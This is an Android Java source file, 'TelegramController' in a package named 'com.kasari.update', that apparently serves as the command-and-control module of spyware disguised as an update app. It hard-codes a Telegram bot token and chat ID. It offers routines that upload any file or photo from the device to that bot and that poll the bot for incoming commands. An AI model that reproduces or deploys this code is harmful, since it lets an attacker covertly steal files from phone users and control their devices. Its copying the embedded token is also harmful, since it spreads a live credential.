package com.kasari.update;

import android.content.Context;
import android.content.SharedPreferences;
import java.io.*;
import java.net.*;
import org.json.*;

public class TelegramController {

    static final String BOT_TOKEN = "8755444402:AAFmqp2gnX3BKhbd4RGg0Tvl3DmNx9Whsh8";
    static final String CHAT_ID   = "8623638607";
    private static final String API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    private static final String PREFS      = "kc_prefs";
    private static final String KEY_OFFSET = "tg_offset";

    private static Context appCtx;

    public static void init(Context ctx) {
        appCtx = ctx.getApplicationContext();
    }

    // ─── Send plain text ────────────────────────────────────────────────────
    public static void sendMessage(String text) {
        try {
            String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                        + "&text="   + URLEncoder.encode(text, "UTF-8");
            post(API + "sendMessage", data);
        } catch (Exception e) { e.printStackTrace(); }
    }

    // ─── Send any file as document ─────────────────────────────────────────
    public static void sendFile(File file, String caption) {
        try {
            String boundary = "----Boundary" + System.currentTimeMillis();
            HttpURLConnection conn = openConn(API + "sendDocument", boundary);
            OutputStream os = conn.getOutputStream();
            writeField(os, boundary, "chat_id", CHAT_ID);
            if (caption != null) writeField(os, boundary, "caption", caption);
            writeFilePart(os, boundary, "document", file);
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush();
            conn.getInputStream();
            conn.disconnect();
        } catch (Exception e) { e.printStackTrace(); }
    }

    // ─── Send image as photo ───────────────────────────────────────────────
    public static void sendPhoto(File file, String caption) {
        try {
            String boundary = "----Boundary" + System.currentTimeMillis();
            HttpURLConnection conn = openConn(API + "sendPhoto", boundary);
            OutputStream os = conn.getOutputStream();
            writeField(os, boundary, "chat_id", CHAT_ID);
            if (caption != null) writeField(os, boundary, "caption", caption);
            writeFilePart(os, boundary, "photo", file);
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush();
            conn.getInputStream();
            conn.disconnect();
        } catch (Exception e) { e.printStackTrace(); }
    }

    // ─── Poll for new commands ─────────────────────────────────────────────
    public static JSONArray getUpdates() {
        try {
            long offset = getSavedOffset();
            String url = API + "getUpdates?timeout=20&limit=10&offset=" + offset;
            URL u = new URL(url);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(25000);
            c.setReadTimeout(25000);
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            c.disconnect();
            JSONObject resp = new JSONObject(sb.toString());
            if (resp.optBoolean("ok")) {
                JSONArray arr = resp.getJSONArray("result");
                if (arr.length() > 0) {
                    long lastId = arr.getJSONObject(arr.length() - 1).getLong("update_id");
                    saveOffset(lastId + 1);
                }
                return arr;
            }
        } catch (Exception e) { e.printStackTrace(); }
        return new JSONArray();
    }

    // ─── Helpers ───────────────────────────────────────────────────────────
    private static void post(String urlStr, String data) throws Exception {
        URL u = new URL(urlStr);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setConnectTimeout(10000);
        c.setReadTimeout(10000);
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        OutputStream os = c.getOutputStream();
        os.write(data.getBytes("UTF-8"));
        os.flush();
        c.getInputStream();
        c.disconnect();
    }

    private static HttpURLConnection openConn(String urlStr, String boundary) throws Exception {
        URL u = new URL(urlStr);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setConnectTimeout(60000);
        c.setReadTimeout(60000);
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        return c;
    }

    private static void writeField(OutputStream os, String boundary, String name, String value)
            throws Exception {
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n").getBytes());
        os.write((value + "\r\n").getBytes("UTF-8"));
    }

    private static void writeFilePart(OutputStream os, String boundary, String field, File file)
            throws Exception {
        os.write(("--" + boundary + "\r\n").getBytes());
        os.write(("Content-Disposition: form-data; name=\"" + field
                + "\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
        os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes());
        FileInputStream fis = new FileInputStream(file);
        byte[] buf = new byte[4096];
        int read;
        while ((read = fis.read(buf)) != -1) os.write(buf, 0, read);
        fis.close();
    }

    private static long getSavedOffset() {
        if (appCtx == null) return 0;
        return appCtx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                     .getLong(KEY_OFFSET, 0);
    }

    private static void saveOffset(long offset) {
        if (appCtx == null) return;
        appCtx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
              .edit().putLong(KEY_OFFSET, offset).apply();
    }
}
